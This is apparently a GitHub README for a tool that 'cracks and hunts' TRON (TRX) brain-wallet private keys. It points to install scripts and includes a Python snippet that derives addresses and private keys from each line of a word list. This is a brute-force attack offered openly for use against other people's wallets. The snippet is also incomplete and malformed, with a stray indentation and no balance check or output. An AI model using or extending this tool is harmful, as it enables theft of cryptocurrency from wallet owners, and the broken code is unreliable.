# Brain X TRX TRON Wallet
Crack and Hunting Private key wallet tron TRX With Passphrase (words)

![Crack and Hunting Private key wallet tron TRX With Passphrase](https://github.com/Pymmdrza/BrainXTRXWallet/raw/mainx/trx_brain_t.gif 'Crack and Hunting Private key wallet tron TRX With Passphrase')

For install on windows use `INSTALL_PACKAGE.bat`

install and looping script on linux running `INSTALL_PACKAGE.sh`

```python3:

mylist = []

with open('words.txt', newline='', encoding='utf-8') as f:
    for line in f:
        mylist.append(line.strip())
        
        
 for i in range(0, len(mylist)):
    passphrase = mylist[i]
    wallet = BrainWallet()
    hext = wallet.generate_address_from_passphrase(passphrase)
    raw = bytes.fromhex(hext)
    key = get_signing_key(raw)
    addr = verifying_key_to_addr(key.get_verifying_key()).decode()
    priv = raw.hex()       

```
